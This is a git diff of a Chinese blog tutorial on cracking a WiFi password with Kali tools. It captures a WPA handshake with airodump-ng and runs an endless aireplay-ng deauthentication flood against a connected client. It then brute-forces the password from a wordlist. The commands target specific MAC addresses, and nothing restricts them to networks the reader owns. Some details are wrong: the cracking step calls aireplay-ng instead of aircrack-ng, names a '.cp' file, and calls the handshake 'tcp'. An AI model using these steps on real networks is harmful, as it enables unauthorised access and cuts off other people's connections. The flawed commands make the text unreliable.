@@ -21,10 +21,10 @@ tags: [kali, WiFi渗透] # add tag
 
 ### 2.监听WiFi热点
 
-**使用airodump-ng wlan0mon命令开始监听周围的WiFi热点，显示周围热点（ctrl+c 停止监听）**
+使用airodump-ng wlan0mon命令开始监听周围的WiFi热点，显示周围热点（ctrl+c 停止监听）
 ![Alt text](/assets/img/监听wifi信号.png)
 
-**选取一个WiFi热点进行监听抓包（当有设备连入当前WiFi后就会抓取tcp握手包并存入保存路径内，坐等……）**
+选取一个WiFi热点进行嗅探抓包（当有设备连入当前WiFi后就会抓取tcp握手包并存入保存路径内，坐等……）
 ```
 airodump-ng -c 1 --bssid 48:0E:EC:7C:32:99 -w ~/a/ 网卡名
 -c  指定频道号(ch)
@@ -33,7 +33,7 @@ airodump-ng -c 1 --bssid 48:0E:EC:7C:32:99 -w ~/a/ 网卡名
 ```
 ![Alt text](/assets/img/监听wifi握手包.png)
 
-**为了加速获取握手包可以选取一个连接当前WiFi的设备进行攻击，使用aireplay给其发送断开包，设备断开后就会进行自动重连**
+为了加速获取握手包可以选取一个连接当前WiFi的设备进行攻击，使用aireplay给其发送断开包，设备断开后就会进行自动重连
 ```
 aireplay-ng -0 0 -c AC:88:FD:14:31:5B -a 48:0E:EC:7C:32:99 网卡名
 -0  表示发起攻击（deauthentication洪水攻击），后面指定攻击次数，设置0则为循环攻击，不停的攻击客户端将无法正常上网（ctrl+c停止）
@@ -43,6 +43,20 @@ aireplay-ng -0 0 -c AC:88:FD:14:31:5B -a 48:0E:EC:7C:32:99 网卡名
 ```
 ![Alt text](/assets/img/攻击.png)
 
-#### 3、字典暴力破解
+这时我们只需等待右上角出现WPA handshake字样，后面跟着BSSID，即为抓到了该无线网的握手包，我们可以使用CTRL+C来停止嗅探握手包。
+![Alt text](/assets/img/获得握手包.png)
 
-* 鼠标相对于当前屏幕的坐标    
+获取到了握手包我们就可以在之前设置的保存路径中看到，其中.cp文件就是我们需要破解的密码
+![Alt text](/assets/img/握手包.png)
+
+### 3、使用字典暴力破解
+
+这一步是整个密码破解的关键，能否成功，取决与你的CPU是否强大，还有你字典的大小，以及字典的质量，密码的复杂程度。
+```
+aireplay-ng -a2 -b 48:0E:EC:7C:32:99 -w ~/1.txt ~/a/-01.cp
+-a2  代表WPA的握手包
+-b  指定要破解的WiFi BSSID
+-w  指定字典文件
+最后是抓取的包
+```
+![Alt text](/assets/img/暴力破解.png)   
